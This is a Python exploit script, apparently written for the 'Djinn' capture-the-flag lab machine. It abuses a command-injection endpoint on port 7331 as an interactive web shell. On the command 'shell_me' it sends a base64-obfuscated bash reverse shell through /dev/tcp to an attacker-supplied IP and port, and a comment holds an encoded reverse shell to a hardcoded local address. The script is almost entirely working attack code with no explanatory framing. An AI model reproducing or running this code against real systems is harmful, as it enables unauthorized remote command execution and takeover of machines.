#!/usr/bin/python3

import requests
import sys
import base64

class col:
    RED = '\033[31m'
    CYAN = '\033[96m'
    B_GREEN = '\033[35m'
    WHITE = '\033[37m'
    GREEN = '\033[92m'
    RESET = '\033[0m'

if len(sys.argv) != 3: 
    print(col.GREEN + "\nUsage: ./djinnCMD.py IPADDRESS REVERSEIP:REVERSEPORT" + col.RESET)
    sys.exit(0)

IP=sys.argv[1]
REV_IP=sys.argv[2].split(":")[0]
REV_PORT= sys.argv[2].split(":")[1]

url=f"http://{IP}:7331/wish"
s = requests.Session()

print(col.CYAN +  "Web Sh3ll for Djinn\n" + col.RESET)

print("Enter a Command...")
try:

    while True:
        cmd = input(col.GREEN + "djinn$: " + col.RESET)    
        
        if cmd == "shell_me":
            print("Sending payload")
            # echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTIzLzk5OTkgMD4mMQo='|base64 -d|bash
            bashshell = f"bash -i >& /dev/tcp/{REV_IP}/{REV_PORT} 0>&1"
            bashbytes = bashshell.encode("ascii")
            b64bytes = base64.b64encode(bashbytes)
            #print(b64bytes.decode("ascii"))
            p = b64bytes.decode("ascii")
            payloadstr = f"echo '{p}'|base64 -d|bash "
            payload = {"cmd":f"{payloadstr}"}
            r =s.post(url, data=payload, allow_redirects=True)
            #print(r.text)

        
        data = {"cmd":cmd}  
        
        r = s.post(url, data=data, allow_redirects=True)
        if r.status_code == 200:
            text = r.text
            text = text.split("<p> ")[1]
            text = text.split("</p>")[0]
            print(col.B_GREEN + f"{text}" + col.RESET)
except:
    print("Error: try again..")
